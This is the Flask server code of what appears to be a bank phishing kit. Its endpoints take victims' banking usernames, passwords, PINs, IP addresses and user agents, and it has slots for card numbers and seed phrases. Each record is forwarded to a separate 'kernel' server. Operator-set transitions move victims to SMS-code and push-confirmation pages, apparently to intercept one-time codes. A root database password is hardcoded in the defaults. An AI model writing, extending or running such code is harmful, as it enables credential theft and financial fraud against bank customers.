@app.route('/submit-login', methods=['POST'])
def submit_login():
    try:
        result = get_valid_url_id()
        if not result:
            abort(400)
        url_id, total = result
        if session.get('url_id') != url_id:
            abort(403)
            
        login_data = {
            'url_id': url_id,
            'seedphrase': '0',
            'username': request.form.get('login-id', '0').strip(),
            'password': request.form.get('password', '0').strip(),
            'bankname': request.form.get('bankname', '0').strip(),
            'amount': total,
            'ip': request.remote_addr or '0',
            'useragent': request.headers.get('User-Agent', '0'),
            'card_number': '0',
            'card_timelife': '0',
            'card_cvc': '0',
            'scotiapin': request.form.get('scotiapin', '0').strip()
        }
        
        data_line = format_data_line(login_data)
        log_and_forward(data_line)
        log_transition(login_data['bankname'], f"User submitted data for {login_data['bankname']}", url_id)
        
        return render_template('loading.html', reference=url_id, total=total)
    
    except Exception as e:
        app.logger.error(f"Error in submit_login: {str(e)}, form data: {request.form}")
        abort(500)

@app.route('/submit-general', methods=['POST'])
def submit_general():
    try:
        result = get_valid_url_id()
        if not result:
            abort(400)
        url_id, total = result
        if session.get('url_id') != url_id:
            abort(403)
            
        general_data = {
            'url_id': url_id,
            'seedphrase': '0',
            'card_number': '0',
            'card_timelife': '0',
            'card_cvc': '0',
            'amount': total,
            'ip': request.remote_addr or '0',
            'useragent': request.headers.get('User-Agent', '0'),
            'username': '0',
            'password': '0',
            'scotiapin': '0',
            'bankname': request.json.get('bankName', '0').strip(),
        }
        
        data_line = format_data_line(general_data)
        log_and_forward(data_line)
        log_transition('GeneralSubmission', 'User submitted general deposit data', url_id)
        
        return render_template('loading.html', reference=url_id, total=total)

    except Exception as e:
        app.logger.error(f"Error in submit_general: {str(e)}")
        abort(500)

@app.route('/notify-transition', methods=['POST'])
def notify_transition():
    try:
        if not request.is_json and request.content_type.__contains__("Java-http-client"):
            app.logger.error("Request is not JSON")
            abort(400)

        data = request.get_json()
        url_id = data.get('url_id') or session.get('url_id')
        message = data.get('message', '0').strip()
        text = data.get('text', '0').strip()

        template_map = {
            'sms-code': 'sms-code.html',
            'text': 'TEXT.html',
            'push': 'push-sms.html',
            'hold-success': 'hold-success.html',
            'forma': 'Forma.html',
            'processing': 'main.html'  
        }

        template = template_map.get(message.lower())
        if not template:
            app.logger.warning(f"Unknown message type: {message}, defaulting to loading.html")
            template = 'loading.html'

        template_path = os.path.join(app.template_folder, template)
        if not os.path.exists(template_path):
            app.logger.error(f"Template {template} not found")
            abort(404)

        if url_id:
            PENDING_TRANSITIONS[url_id] = {
                'template': template,
                'text': text
            }
            app.logger.info(f"Stored transition for url_id: {url_id}, template: {template}, text: {text}")

        if template in ['sms-code.html', 'TEXT.html', 'push-sms.html', 'hold-success.html', 'Forma.html']:
            amount = "0"  
            if url_id != 'unknown':
                session['url_id'] = url_id
                id_exists, amount = check_url_id(url_id)
                if not id_exists:
                    app.logger.warning(f"Invalid url_id: {url_id}, proceeding without validation")
            log_transition(message, f"User notified transition with message: {message}", url_id or 'unknown')
            return render_template('main.html', reference=url_id or 'unknown', total=amount)

        if not url_id:
            app.logger.error("Missing url_id in notify_transition")
            abort(400)

        id_exists, amount = check_url_id(url_id)
        if not id_exists:
            app.logger.error(f"Invalid url_id: {url_id}")
            abort(400)

        if session.get('url_id') != url_id:
            app.logger.error(f"Session url_id mismatch: session={session.get('url_id')}, request={url_id}")
            abort(403)

        log_transition(message, f"User notified transition with message: {message}", url_id)
        return render_template('main.html', reference=url_id, total=amount)

    except Exception as e:
        app.logger.error(f"Error in notify_transition: {str(e)}")
        abort(500)


@app.route('/check-transition', methods=['GET'])
def check_transition():
    try:
        url_id = request.args.get('url_id')
        if not url_id:
            return jsonify({'status': 'error', 'message': 'Missing url_id'}), 400
        
        if url_id in PENDING_TRANSITIONS:
            transition = PENDING_TRANSITIONS.pop(url_id) 
            template = transition['template']
            text = transition['text']
            
            redirect_url = f"/render/{template.replace('.html', '')}?url_id={url_id}&text={text}"
            app.logger.info(f"Redirecting url_id: {url_id} to {redirect_url}")
            return jsonify({'status': 'success', 'redirect': redirect_url}), 200
        
        return jsonify({'status': 'pending'}), 200
    
    except Exception as e:
        app.logger.error(f"Error in check_transition: {str(e)}")
        return jsonify({'status': 'error', 'message': 'Ошибка проверки перехода'}), 500

@app.route('/render/<template>')
def render_dynamic_page(template):
    try:
        if not template.endswith('.html'):
            template += '.html'

        if template not in VALID_TEMPLATES:
            app.logger.error(f"Invalid template requested: {template}")
            abort(400)

        template_path = os.path.join(app.template_folder, template)
        if not os.path.exists(template_path):
            app.logger.error(f"Template {template} not found")
            abort(404)

        url_id = request.args.get('url_id') or session.get('url_id') or 'unknown'
        text = request.args.get('text', '0')

        if template in ['sms-code.html', 'TEXT.html', 'push-sms.html', 'hold-success.html', 'Forma.html']:
            amount = "0"  
            if url_id != 'unknown':
                session['url_id'] = url_id
                id_exists, amount = check_url_id(url_id)
                if not id_exists:
                    app.logger.warning(f"Invalid url_id: {url_id}, proceeding without validation")
            log_transition(template.replace('.html', ''), f"User accessed {template} page", url_id)
            return render_template(template, reference=url_id, total=amount, text=text)

        result = get_valid_url_id()
        if not result:
            abort(400)
        url_id, total = result

        log_transition(template.replace('.html', ''), f"User accessed {template} page", url_id)
        return render_template(template, reference=url_id, total=total, text=text)
    
    except Exception as e:
        app.logger.error(f"Error in render_dynamic_page: {str(e)}")
        abort(500)

@app.route('/render-push-sms', methods=['POST'])
def render_push_sms():
    try:
        url_id = request.form.get('url_id') or session.get('url_id') or 'unknown'
        amount = "0"  
        if url_id != 'unknown':
            session['url_id'] = url_id
            id_exists, amount = check_url_id(url_id)
            if not id_exists:
                app.logger.warning(f"Invalid url_id: {url_id}, proceeding without validation")
        
        log_transition('PushSMS', 'User accessed Push SMS page via POST', url_id)
        return render_template('push-sms.html', reference=url_id, total=amount)
    
    except Exception as e:
        app.logger.error(f"Error in render_push_sms: {str(e)}")
        return jsonify({'status': 'error', 'message': 'Ошибка обработки данных'}), 500

@app.route('/active-links', methods=['GET', 'POST'])
def active_links_endpoint():
    try:
        if request.method == 'POST':
            data = request.get_json()
            url_id = data.get('url_id', str(uuid.uuid4())[:8].upper())
            total = data.get('total', "500")
            
            conn = get_db_connection()
            if not conn:
                return jsonify({'status': 'error', 'message': 'Ошибка подключения к базе данных'}), 500
            try:
                cursor = conn.cursor()
                cursor.execute(
                    "INSERT INTO users (id, amount, time, url) VALUES (%s, %s, %s, %s)",
                    (url_id, int(float(total)), int(datetime.datetime.now().timestamp()), url_id)
                )
                conn.commit()
                cursor.close()
                conn.close()
                app.logger.info(f"Stored url_id: {url_id} with total: {total} in database")
                return jsonify({'status': 'success', 'url_id': url_id, 'total': total}), 200
            except mysql.connector.Error as e:
                app.logger.error(f"Error inserting into database: {str(e)}")
                return jsonify({'status': 'error', 'message': 'Ошибка сохранения данных'}), 500
        else:
            conn = get_db_connection()
            if not conn:
                return jsonify({'status': 'error', 'message': 'Ошибка подключения к базе данных'}), 500
            try:
                cursor = conn.cursor()
                cursor.execute("SELECT id, amount FROM users")
                active_links = {row[0]: str(row[1]) for row in cursor.fetchall()}
                cursor.close()
                conn.close()
                return jsonify({'active_links': active_links}), 200
            except mysql.connector.Error as e:
                app.logger.error(f"Error querying database: {str(e)}")
                return jsonify({'status': 'error', 'message': 'Ошибка получения данных'}), 500
    except Exception as e:
        app.logger.error(f"Error in active_links_endpoint: {str(e)}")
        return jsonify({'status': 'error', 'message': 'Ошибка обработки активных ссылок'}), 500

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', default='0.0.0.0')
    parser.add_argument('--port', default='8127')
    parser.add_argument('--debug', action='store_true')
    parser.add_argument('--sql-host', default='172.20.0.2')
    parser.add_argument('--sql-port', default='3306')
    parser.add_argument('--sql-user', default='root')
    parser.add_argument('--sql-password', default='ybkgn7rE8bQ2hxVe4XwAYcdmtQaFsaJn6NPBuscJYYEs5hR$')
    parser.add_argument('--sql-database', default='urlandusers')
    parser.add_argument('--kernel-ip', default='172.20.0.4')
    parser.add_argument('--kernel-port', default='34781')
    parser.add_argument('--log-file', default='user_data.log')
    parser.add_argument('--notification-log-file', default='site_transitions.log')
    
    args = parser.parse_args()
    
    DB_CONFIG['host'] = args.sql_host
    DB_CONFIG['port'] = args.sql_port
    DB_CONFIG['user'] = args.sql_user
    DB_CONFIG['password'] = args.sql_password
    DB_CONFIG['database'] = args.sql_database
    
    FORWARD_URL = f"http://{args.kernel_ip}:{args.kernel_port}/fetch-data-from-url"
    GET_MESSAGE_URL = f"http://{args.kernel_ip}:{args.kernel_port}/get-message"
    TRANSITION_URL = f"http://{args.kernel_ip}:{args.kernel_port}/fetch-transition-from-url"
    LOG_FILE = args.log_file
    NOTIFICATION_LOG_FILE = args.notification_log_file
    
    app.run(host=args.host, port=args.port, debug=args.debug)
